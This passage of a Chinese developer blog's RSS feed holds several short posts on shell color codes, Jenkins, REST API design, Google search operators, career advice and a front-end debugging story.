      <title>彩色文本与彩色背景打印</title>
      <link>https://wdd.js.org/shell/colorful-print/</link>
      <pubDate>Wed, 16 Oct 2019 13:57:29 +0800</pubDate>
      <guid>https://wdd.js.org/shell/colorful-print/</guid>
      <description>&lt;h1 id=&#34;打印彩色字体&#34;&gt;打印彩色字体&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;0 重置&lt;/li&gt;
&lt;li&gt;30 黑色&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;31 红色&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;32 绿色&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;33 黄色&lt;/li&gt;
&lt;li&gt;34 蓝色&lt;/li&gt;
&lt;li&gt;35 洋红&lt;/li&gt;
&lt;li&gt;36 青色&lt;/li&gt;
&lt;li&gt;37 白色&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把 31 改成其他数字，就可打印其他颜色的 this 了。大部分情况下，我们只需要记住红色和绿色就可以了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\e[1;31m this \e[0m whang&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;打印彩色背景&#34;&gt;打印彩色背景&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;0 重置&lt;/li&gt;
&lt;li&gt;40 黑色&lt;/li&gt;
&lt;li&gt;41 红色&lt;/li&gt;
&lt;li&gt;42 绿色&lt;/li&gt;
&lt;li&gt;43 黄色&lt;/li&gt;
&lt;li&gt;44 蓝色&lt;/li&gt;
&lt;li&gt;45 洋红&lt;/li&gt;
&lt;li&gt;46 青色&lt;/li&gt;
&lt;li&gt;47 白色&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\e[1;45m this \e[0m whang&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Jenkins 全局变量参考</title>
      <link>https://wdd.js.org/posts/2019/10/ikg19e/</link>
      <pubDate>Tue, 15 Oct 2019 22:34:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/ikg19e/</guid>
      <description>&lt;h1 id=&#34;docker&#34;&gt;docker&lt;/h1&gt;
&lt;p&gt;The docker variable offers convenient access to Docker-related functions from a Pipeline script.&lt;/p&gt;
&lt;p&gt;Methods needing a slave will implicitly run a node {…} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.)&lt;/p&gt;</description>
    </item>
    <item>
      <title>Restful API 架构思考</title>
      <link>https://wdd.js.org/posts/2019/10/irl0p4/</link>
      <pubDate>Tue, 15 Oct 2019 22:32:40 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/irl0p4/</guid>
      <description>&lt;h1 id=&#34;1-什么是rest&#34;&gt;1. 什么是REST?&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;表现层状态转换（REST，英文：Representational State Transfer）是Roy Thomas Fielding博士于2000年在他的博士论文[1] 中提出来的一种万维网软件架构风格，目的是便于不同软件/程序在网络（例如互联网）中互相传递信息。表现层状态转换（REST，英文：Representational State Transfer）是根基于超文本传输协议(HTTP)之上而确定的一组约束和属性，是一种设计提供万维网络服务的软件构建风格。匹配或兼容于这种架构风格(简称为 REST 或 RESTful)的网络服务，允许客户端发出以统一资源标识符访问和操作网络资源的请求，而与预先定义好的无状态操作集一致化。&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%A1%A8%E7%8E%B0%E5%B1%82%E7%8A%B6%E6%80%81%E8%BD%AC%E6%8D%A2&#34;&gt;wikipdeia&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/irl0p4/2022-10-29-20-02-04.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;REST API 不是一个标准或者一个是协议，仅仅是一种风格，一种style。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;RESTful API的简单定义可以轻松解释这个概念。 REST是一种架构风格，RESTful是它的解释。也就是说，如果您的后端服务器具有REST API，并且您（从网站/应用程序）向客户端请求此API，则您的客户端为RESTful。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/irl0p4/2022-10-29-20-02-12.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-rest-api最为重要的约束&#34;&gt;2. REST API最为重要的约束&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Client-Server&lt;/code&gt; 通信只能由客户端单方面发起，表现为请求-响应的形式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Stateless&lt;/code&gt; 通信的会话状态（Session State）应该全部由客户端负责维护&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Cache&lt;/code&gt; 响应内容可以在通信链的某处被缓存，以改善网络效率&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Uniform Interface&lt;/code&gt; 通信链的组件之间通过统一的接口相互通信，以提高交互的可见性&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Layered System&lt;/code&gt; 通过限制组件的行为（即每个组件只能“看到”与其交互的紧邻层），将架构分解为若干等级的层。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Code-On-Demand&lt;/code&gt; 支持通过下载并执行一些代码（例如Java Applet、Flash或JavaScript），对客户端的功能进行扩展。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-rest-api-http方法-与-curd&#34;&gt;3. REST API HTTP方法 与 CURD&lt;/h1&gt;
&lt;p&gt;REST API 使用POST，GET, PUT, DELETE的HTTP方法来描述对资源的增、查、改、删。&lt;!-- raw HTML omitted --&gt;这四个HTTP方法在数据层对应着SQL的插入、查询、更新、删除操作。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/irl0p4/2022-10-29-20-02-20.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-状态码&#34;&gt;4. 状态码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1xx&lt;/code&gt; - informational;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2xx&lt;/code&gt; - success;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;3xx&lt;/code&gt; - redirection;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;4xx&lt;/code&gt; - client error;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;5xx&lt;/code&gt; - server error.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;5-restful架构设计&#34;&gt;5. RESTful架构设计&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;GET&lt;/code&gt; /users - get all users;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET&lt;/code&gt; /users/123 - get a particular user with id = 123;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GET&lt;/code&gt; /posts - get all posts.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POST&lt;/code&gt; /users.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUT&lt;/code&gt; /users/123 - upgrade a user entity with id = 123.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DELETE&lt;/code&gt; /users/123 - delete a user with id = 123.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;6-文档&#34;&gt;6. 文档&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/irl0p4/2022-10-29-20-02-30.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>掌握谷歌搜索高级指令</title>
      <link>https://wdd.js.org/posts/2019/10/giflpm/</link>
      <pubDate>Tue, 15 Oct 2019 22:30:27 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/giflpm/</guid>
      <description>&lt;h1 id=&#34;1-谷歌搜索指令&#34;&gt;1. 谷歌搜索指令&lt;/h1&gt;
&lt;h1 id=&#34;2-基本命令&#34;&gt;2. 基本命令&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;符号&lt;/th&gt;
          &lt;th&gt;简介&lt;/th&gt;
          &lt;th&gt;语法&lt;/th&gt;
          &lt;th&gt;注意点&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;+&lt;/td&gt;
          &lt;td&gt;包含A且必须包含B&lt;/td&gt;
          &lt;td&gt;A +B&lt;/td&gt;
          &lt;td&gt;A和+之间有空格&lt;/td&gt;
          &lt;td&gt;Maxwell +wills&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-&lt;/td&gt;
          &lt;td&gt;包含A且不包含B&lt;/td&gt;
          &lt;td&gt;A -B&lt;/td&gt;
          &lt;td&gt;A和+之间有空格&lt;/td&gt;
          &lt;td&gt;Maxwell -Absolom&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&amp;quot; &amp;quot;&lt;/td&gt;
          &lt;td&gt;完整匹配AB&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;AB&amp;rdquo;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&amp;ldquo;Thomas Jefferson&amp;rdquo;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;OR&lt;/td&gt;
          &lt;td&gt;包含A或者B&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;A OR B&lt;/code&gt; 或者 `A&lt;/td&gt;
          &lt;td&gt;B`&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;+-&amp;ldquo;OR&lt;/td&gt;
          &lt;td&gt;指令可以组合，完成更复杂的查询&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;beach -sandy +albert +nathaniel&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;~&lt;/td&gt;
          &lt;td&gt;包含A, 并且包含B的近义词&lt;/td&gt;
          &lt;td&gt;A ~B&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;github ~js&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;..&lt;/td&gt;
          &lt;td&gt;区间查询 AB之间&lt;/td&gt;
          &lt;td&gt;A..B&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;china 1888..2000&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;*&lt;/td&gt;
          &lt;td&gt;匹配任意字符&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;node* java&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;site:&lt;/td&gt;
          &lt;td&gt;站内搜索&lt;/td&gt;
          &lt;td&gt;A site:B&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;filetype:&lt;/td&gt;
          &lt;td&gt;按照文件类型搜索&lt;/td&gt;
          &lt;td&gt;A filetype:B&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;csta filetype:pdf&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;3-关键词使用&#34;&gt;3. 关键词使用&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方法&lt;/th&gt;
          &lt;th&gt;说明&lt;/th&gt;
          &lt;th&gt;示例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;列举关键词&lt;/td&gt;
          &lt;td&gt;列举所有和搜索相关的关键词，并且尽量把重要的关键词排在前面。&lt;code&gt;不同的关键词顺序会导致不同的返回不同的结果&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;书法 毛笔 绘画&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;不要使用某些词&lt;/td&gt;
          &lt;td&gt;如代词介词语气词，如i, the, of, it, 我，吗&lt;/td&gt;
          &lt;td&gt;搜索引擎一般会直接忽略这些信息含量少的词&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;大小写不敏感&lt;/td&gt;
          &lt;td&gt;大写字符和小写字符在搜索引擎看没有区别，尽量使用小写的就可以&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;4-特殊工具&#34;&gt;4. 特殊工具&lt;/h1&gt;
&lt;h2 id=&#34;41-define-快速返回关键词定义&#34;&gt;4.1. define 快速返回关键词定义&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/giflpm/2022-10-29-19-51-09.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何成为从培训班里出来的牛人？</title>
      <link>https://wdd.js.org/posts/2019/10/vyu2rs/</link>
      <pubDate>Tue, 15 Oct 2019 22:25:56 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/vyu2rs/</guid>
      <description>&lt;h1 id=&#34;1-培训行业的现状和问题&#34;&gt;1. 培训行业的现状和问题&lt;/h1&gt;
&lt;p&gt;进入培训班学习可能有一下两个原因：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;想转行&lt;/li&gt;
&lt;li&gt;学校里学的东西太过时了，需要深入学习本行业的知识&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;培训的行业的核心思想都是：如何快速的让你能够面试通过&lt;/p&gt;
&lt;p&gt;老师教的东西大多是一些面试必须要问的一些知识，做的项目也应该都是市面上比较火的项目。这么做的不利之处有以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;局限性：知识局限于教师的授课范围，知识面窄&lt;/li&gt;
&lt;li&gt;扩展性：快餐式学习管饱不管消化，很多知识吸收不高，无法举一反三&lt;/li&gt;
&lt;li&gt;系统性：没有系统的整体知识体系&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以这些因素可能会让用人不太喜欢培训出来的应聘者，而往往希望刚毕业的应届生。但是，培训行业出来的应聘者，也不乏国士无双的牛逼人物。&lt;/p&gt;
&lt;h1 id=&#34;2-如何成为培训出来的牛人&#34;&gt;2. 如何成为培训出来的牛人？&lt;/h1&gt;
&lt;p&gt;无论在哪个行业，自学都是必不可少的事情。毕业不是学习的终点，而应该是起点。你和技术牛人之间的距离或许并不遥远，可能只是一个芭蕉扇的距离。&lt;/p&gt;
&lt;h2 id=&#34;21-读权威书籍扎实理论基础&#34;&gt;2.1. 读权威书籍，扎实理论基础&lt;/h2&gt;
&lt;p&gt;每个行业都有一些经历时间考验而熠熠生辉的经典数据，例如在前端行业。我认为下面两本书是必须要读完一本的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;基础&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/10546125/&#34;&gt;JavaScript高级程序设计&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/1232061/&#34;&gt;JavaScript权威指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;进阶&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/3590768/&#34;&gt;JavaScript语言精粹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/26638316/&#34;&gt;JavaScript忍者秘籍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/25883834/&#34;&gt;You Don&amp;rsquo;t Know JS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://llh911001.gitbooks.io/mostly-adequate-guide-chinese/content/&#34;&gt;JS函数式编程指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;22-动手能力闲话少说放码过来&#34;&gt;2.2. 动手能力，闲话少说，放码过来&lt;/h2&gt;
&lt;p&gt;各种demo啊，效果啊，有时间自己都可以撸一遍，放在github上，又不收钱，还能提高动手能力。&lt;/p&gt;
&lt;h2 id=&#34;23-数据结构&#34;&gt;2.3. 数据结构&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;差劲的程序员操心代码，牛逼的程序员操心数据结构和它们之间的关系。 一一Linus Torvalds, Linux 创始人&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;优秀的数据结构，可以节省你80%的编码时间。差劲的数据结构，你需要花大量的时间去做各种高难度动作的转换，一不小心，数据库就要累的气喘如牛，停机罢工。&lt;/p&gt;
&lt;h2 id=&#34;24-知识积累从博客开始&#34;&gt;2.4. 知识积累，从博客开始&lt;/h2&gt;
&lt;p&gt;如果你已经在某个行业工作个两三年，一篇像样的博客都没有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;那我觉得你可能是个懒人。&lt;/code&gt;因为几乎很少写东西。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;我觉得你可以是个自私的人。&lt;/code&gt;因为做计算机行业的，谁没有用过别人造的轮子。即使你没有造轮子的能力，即使你给出一个问题应该如何解决的，至少你对计算机行业也作出了你的贡献。&lt;/p&gt;
&lt;h2 id=&#34;25-互联网的基石-tcp-ip&#34;&gt;2.5. 互联网的基石 TCP IP&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180312205615_vUZuEg_.jpeg#align=left&amp;display=inline&amp;height=226&amp;originHeight=226&amp;originWidth=223&amp;status=uploading&amp;width=223&#34;&gt;&lt;/p&gt;
&lt;p&gt;计算机行业是分层的，就像大海一样，海面上的往往都是惊涛骇浪，暴风骤雨，各种框架层出不穷，争奇斗艳。当你深入海底，你会发现，那里是最平静的地方。而TCP IP等协议知识，就是整个互联网大航海时代的海底。互联网行业如此多娇，引无数框架竞折腰。浪潮之巅者成为行业热点，所有资源会喷薄涌入，失去优势被替代者，往往折戟沉沙铁未销。总之，越是上层，竞争越激烈，换代越快。&lt;/p&gt;
&lt;p&gt;但是底层的TCP/IP之类的知识，往往几十年都不会有多大的改变。而且无论你从事什么语言开发，只要你涉及到通信了，你就需要TCP/IP的知识点，不过你不清楚这些知识点，你可以随时给自己埋下定时炸弹。&lt;/p&gt;
&lt;p&gt;这个错误我也犯过，你可以看我的犯错记录：&lt;a href=&#34;https://wdd.js.org/tcp-high-recv-q-or-send-q-reasons.html&#34;&gt;哑代理 - TCP链接高Recv-Q，内存泄露的罪魁祸首&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;关于TCP/IP, 推荐一下书籍&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;基础&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/24737674/&#34;&gt;图解TCP/IP : 第5版&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/25863515/&#34;&gt;图解HTTP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;进阶&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/10746113/&#34;&gt;HTTP权威指南&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;26-工具的威力&#34;&gt;2.6. 工具的威力&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;你用刀，我用枪，谁说谁能打过谁&lt;/code&gt;。原始社会两个野蛮人相遇，块头大的，食物多，可以拥有更多的繁衍后代的权利。但是当一个野蛮人知道用刀的威力时，他就不会害怕胳膊比较粗的对手了。&lt;/p&gt;
&lt;p&gt;举例来说，前端开发免不了有时需要一个静态文件服务器，如果你只知道阿帕奇，那你的工具也太落后了。你可以看看这篇文章：&lt;a href=&#34;https://wdd.js.org/one-command-create-static-file-server.html&#34;&gt;一行命令搭建简易静态文件http服务器&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;当你想要更偷懒，想要不安于现状时，你会找到更多的厉害的工具。&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>你不知道的专业化道路</title>
      <link>https://wdd.js.org/posts/2019/10/vpqfyr/</link>
      <pubDate>Tue, 15 Oct 2019 22:25:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/vpqfyr/</guid>
      <description>&lt;h1 id=&#34;从分工到专业化&#34;&gt;从分工到专业化&lt;/h1&gt;
&lt;p&gt;分工提高生产效率，专业化提高个人价值。很多人都认为，一旦我们进入了某一行，我们就应该在这个行业深挖到底。例如我是做前端的，我就会去学习各种前端的知识点，各种层出不穷的框架。我总是在如饥似渴的希望自己能够保持在深入学习的状态，我不想哪一天自己突然out了。&lt;/p&gt;
&lt;h1 id=&#34;专业化的危机在哪&#34;&gt;专业化的危机在哪？&lt;/h1&gt;
&lt;p&gt;以前我在上初中的时候，就稍稍的学习了一点点ActionScript的知识。可能有些人不知道ActionScript是干嘛的，它是在flash的环境中工作的，可以在flash里做一些动画和特效之类的。那时候flash是很火的技术，几乎所有的网站都是有flash的，所以会ActionScript语言的程序员，工资都不低。&lt;/p&gt;
&lt;p&gt;但是，你现在还听过什么ActionScript吗？ 它的宿主环境flash都已经被淘汰了，皮之不存毛将焉附。可想而知，flash的淘汰，同时也让时长淘汰了一批在ActionScript的专家。&lt;/p&gt;
&lt;p&gt;所以，专业化并不是一个安全的道路。准确来说，世界上本来就没有安全的路。大多说认为这条路安全，是因为他们总是以静态的眼光看这条路。说点题外话，如果你书读多了，你会发现，其实一直在你思想里的那些观念，那些故事，往往都是忽悠人的。你可以看看我的一个书单：&lt;a href=&#34;https://wdd.js.org/2018-reading-plan.html&#34;&gt;2018年我的阅读计划&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;从企业的角度考虑，每个老板都想招在某一方面专家。但是从个人的角度考虑，如果你在专业化的道路钻研的非常深，或许有时候你应该放慢脚步，找个长椅，坐着想一想，如果你前面马上就是死路了，你应该怎么办？&lt;/p&gt;
&lt;h1 id=&#34;我们应该怎么办&#34;&gt;我们应该怎么办？&lt;/h1&gt;
&lt;p&gt;世界上没有安全的路，世界上也没有一直安全的职业。一个职业的火爆，往往因为这个行业的火爆。而永远也没有永远火爆的行业，当退潮时，将会有大批的弄潮儿会搁浅，干死，窒息&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;除去环境造成的扰动，人的身体也会随着年龄会慢慢老化。&lt;/p&gt;
&lt;p&gt;你可以想象一下，当你四十多岁时。那些新来的实习生，比你要的工资低，比你更容易接受这个行业的前沿知识，比你更加能加班，比你能力更强时，比你更听话时。你的优势在哪里？我相信到那时候，你的领导会毫不犹豫开了你。&lt;/p&gt;
&lt;p&gt;在此，你要改变。我给出以下几个角度，你可以自行延伸。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开始锻炼身体 这是一切的基石&lt;/li&gt;
&lt;li&gt;搞一搞副业，学习一下你喜欢的东西，你可以去深入学学如何做菜，如何摄影等等&lt;/li&gt;
&lt;li&gt;学习理财知识，这是学校从没教你的，但是却是非常重要的东西&lt;/li&gt;
&lt;li&gt;读书，越多越好&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考文献&#34;&gt;参考文献&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/1790456/&#34;&gt;专业主义 日 大前研一 &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/25816940/&#34;&gt;富爸爸穷爸爸 罗伯特·清崎 / 莎伦·莱希特&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/1261560/&#34;&gt;国富论 英 亚当·斯密&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/5375620/&#34;&gt;失控&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.douban.com/subject/1012611/&#34;&gt;乌合之众 法 古斯塔夫·勒庞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://survivor.ruanyifeng.com/index.html&#34;&gt;未来世界的幸存者 阮一峰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.gitbook.com/book/xiaolai/reborn/details&#34;&gt;新生 七年就是一辈子 李笑来&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>我苦苦寻找诡异的bug原因，其实是我的无知</title>
      <link>https://wdd.js.org/posts/2019/10/qmgxqm/</link>
      <pubDate>Tue, 15 Oct 2019 22:22:24 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/qmgxqm/</guid>
      <description>&lt;h1 id=&#34;1-问题1chosen插件无法显示图标&#34;&gt;1. 问题1：chosen插件无法显示图标&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;问题现象&lt;/code&gt;&lt;!-- raw HTML omitted --&gt;在我本地调试的时候，我使用了一个多选下拉框的插件，就是&lt;a href=&#34;https://harvesthq.github.io/chosen/&#34;&gt;chosen&lt;/a&gt;, 不知道为什么，这个多选框上面的图标不见了。我找了半天没有找到原因，然后我把我的机器的内网地址给我同事，让他访问我机器，当它访问到这个页面时。他的电脑上居然显示出了这个下拉框的图标。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这是什么鬼？&lt;/code&gt;, 为什么同样的代码，在我的电脑上显示不出图标，但是在他的电脑上可以显示。有句名言说的好：&lt;code&gt;没有什么bug是一遍调试解决不了的，如果有，就再仔细调试一遍&lt;/code&gt;。于是我就再次调试一遍。&lt;/p&gt;
&lt;p&gt;我发现了一些第一遍没有注意到的东西&lt;code&gt;媒体查询&lt;/code&gt;，就是在css里有这样的语句：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;@media
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从这里作为切入口，我发现：&lt;code&gt;媒体查询的类会覆盖它原生的类的属性&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于我的电脑视网膜屏幕，分辨率比较高，触发了媒体查询，这就导致了媒体查询的类覆盖了原生的类。而覆盖后的类，使用了&lt;code&gt;chosen-sprite@2x.png&lt;/code&gt;作为图标的背景图片。但是这个图片并没有被放在这个插件的目录下，有的只有&lt;code&gt;chosen-sprite.png&lt;/code&gt;这个图片。在一般情况下，都是用&lt;code&gt;chosen-sprite.png&lt;/code&gt;作为背景图片的。这就解释了：为什么同事的电脑上出现了图标，但是我的电脑上没有出现这个图标。&lt;/p&gt;
&lt;p&gt;总结: &lt;code&gt;如果你要使用一个插件，你最好把这个插件的所有文件都放在同一个目录下。而不要只放一些你认为有用的文件。最后：媒体查询的相关知识也是必要的。&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-问题2jquery-与-vue之间的暧昧&#34;&gt;2. 问题2：jQuery 与 Vue之间的暧昧&lt;/h1&gt;
&lt;p&gt;jQuery流派代表着直接操纵DOM的流派，Vue流派代表着操纵数据的流派。&lt;/p&gt;
&lt;p&gt;如果在项目里，你使用了一些jQuery插件，也使用了Vue，这就可能导致一些问题。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
    &amp;lt;script src=&amp;#34;https://cdn.bootcss.com/vue/2.4.4/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
